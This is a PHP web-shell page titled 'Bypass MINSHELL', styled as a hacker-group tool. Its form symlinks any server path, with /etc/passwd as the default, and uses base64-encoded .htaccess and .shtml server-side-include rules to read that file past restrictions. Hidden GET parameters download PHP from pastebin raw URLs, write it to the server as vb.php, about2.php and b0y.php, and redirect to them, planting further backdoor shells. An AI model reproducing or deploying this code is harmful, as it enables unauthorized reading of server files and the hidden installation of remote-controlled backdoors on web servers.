<html>
<head>
<title>
Bypass MINSHELL
</title>
</head>
<body></font><form method="POST">
<pre>
 ______  __     __   ___   ___             __       ________    _______   ___   ______    
/_____/\/__/\ /__/\ /__/\ /__/\           /_/\     /_______/\ /_______/\ /__/\ /_____/\  
\:::__\/\ \::\\:.\ \\::\ \\  \ \   _______\:\ \    \::: _  \ \\::: _  \ \\::\ \\:::__\/  
   /: /  \_\::_\:_\/ \::\/_\ .\ \ /______/\\:\ \    \::(_)  \ \\::(_)  \/_\:_\/   /: /    
  /::/___  _\/__\_\_/\\:: ___::\ \\__::::\/ \:\ \____\:: __  \ \\::  _  \ \      /::/___  
 /_:/____/\\ \ \ \::\ \\: \ \\::\ \          \:\/___/\\:.\ \  \ \\::(_)  \ \    /_:/____/\
 \_______\/ \_\/  \__\/ \__\/ \::\/           \_____\/ \__\/\__\/ \_______\/    \_______\/
                                                                                         
</pre><p><font face="Verdana" size="2" color="#FF0000">Nobody Likes Us :) </font></p><br><br>
<div align="left">
        <table border="0" cellspacing="0" cellpadding="0" width="797">
                <tr>
                        <td>
                        <font face="Verdana" color="#FF0000">
                        <p align="left"><font face="Tahoma"><font color="#FF0000">Full PATH</font> :
<font size="3">&nbsp;<b><input value="/etc/passwd" name="path" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" size="44" tabindex="15">&nbsp;&nbsp;&nbsp;&nbsp;</b></font></font></p>
                        </font>
                        <font face="Tahoma" color="#FF0000">
                        <p align="left">File Name</font><font face="Verdana" color="#FF0000"><font face="Tahoma"> :
<font size="3">&nbsp;<b><input value="b0x.txt" name="filename" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" size="44" tabindex="15">&nbsp;&nbsp;&nbsp;&nbsp;</b></font></font></p>
                        <p align="left"><font size="3" face="Tahoma"><b>&nbsp;&nbsp;&nbsp;
                        </b></font>
                        <b><font size="3" face="Tahoma">
<input type="submit" value="Execute" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="z00z"></font></b></p>
                        <b><font size="3" face="Tahoma">
                        </form>
 
                        <?php
                       
# Security4Ever | sec4ever.com | n1x.cc
# Greet'z 2 n1x | Sec4ever | The Injector | I-Hmx | h311coD3 | X-Shadow | Th3MMA | Jago-Dz | BlackHunter | Mr.L4iv3 | RayMon | Ma3stRo_DZ | Lagripe-DZ | RxR | OsSi | HeliA | Dr AnGeL | FoX HaCkER | R3d-DevIL | x3
# Special Greet'z 2 FreeMAN[LY] | T0R0B0XHACKER |
# All Rights Reserved To The Injector
                       
                       
                       
                        $path = $_POST['path'];
                        $file = $_POST['filename'];
                        if($_POST['z00z']){    
                                echo'          
                        <br><br><span style="background-color: #FFFFFF">Status b0x</span></font></b><font face="Verdana"><span style="background-color: #FFFFFF"><br>
                        </span></font>
<textarea rows="12" cols="96" name="Status b0x" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000">';
Error_reporting(0);
$direcotry = "b0x";
$comp="IyBDcmVhdGVkIEJ5IFR1cmtpc0gtUnVsZVoNCiMgR2VuZXJhdGVkIEJ5IFRSLUxTMg0KT3B0aW9ucyArSW5jbHVkZXMNCkFkZFR5cGUgdGV4dC9odG1sIC5zaHRtbA0KQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5zaHRtbA0K";
$mkdir = @mkdir($direcotry);
if($mkdir){
echo "[+] Creating Directory ... Done\n\n";
}else{
echo"[+] I Can't Make New Folder , But I'll Continue If It Exist's !\n\n";
}
@symlink("$path","b0x/$file");
 
$open = fopen("b0x/.htaccess","w");
$handle = fwrite($open,base64_decode($comp));
@fclose($open);
if($open){
echo"[+] Opening Apache Access File ... Done\n\n";
}else{
echo"[+] Access is Denied , Try Again With User Privilege :) \n\n";
exit;
}

if(isset($_GET["wibu"])){
$anak1 = file_get_contents("https://pastebin.com/raw/wjp2fLAE");
$nggawe1 = fopen("vb.php","w") or die ("gabisa bro");
fwrite($nggawe1,$anak1);
fclose($nggawe1);
header ("Location:vb.php");
chmod("vb.php",0644);
}

if(isset($_GET["shell"])){
$anak1 = file_get_contents("https://pastebin.com/raw/FbEHDbuz");
$nggawe1 = fopen("about2.php","w") or die ("gabisa bro");
fwrite($nggawe1,$anak1);
fclose($nggawe1);
header ("Location:about2.php");
chmod("about2.php",0644);
}

if(isset($_GET["bypass"])){
$anak1 = file_get_contents("https://pastebin.com/raw/L0c96Gi4");
$nggawe1 = fopen("b0y.php","w") or die ("gabisa bro");
fwrite($nggawe1,$anak1);
fclose($nggawe1);
header ("Location:b0y.php");
chmod("b0y.php",0644);
}
 
if($handle){
echo"[+] Writing Access RuleZ ... Done \n\n";
}
 
$r1z="PCEtLSNpbmNsdWRlIHZpcnR1YWw9Ig==";
$r1zcom = "IiAtLT4=";
$open2 = fopen("b0x/b0x.shtml","w");
$handle2 = fwrite($open2,base64_decode($r1z).$file.base64_decode($r1zcom));
@fclose($open2);
if($open2){
echo"[+] Opening Server HTML Web Page ... Done\n\n";
}else{
echo"[+] Access is Denied , Try Again With User Privilege :) \n\n";
exit;
}
 
if($handle2){
echo"[+] Writing SHTML RuleZ ... Done \n\n";
echo"[+] All Task'z Have Done !";
}

echo'
</textarea></td>
                </tr>
        </table>
</div>
<p>&nbsp;</p>
';
}
?>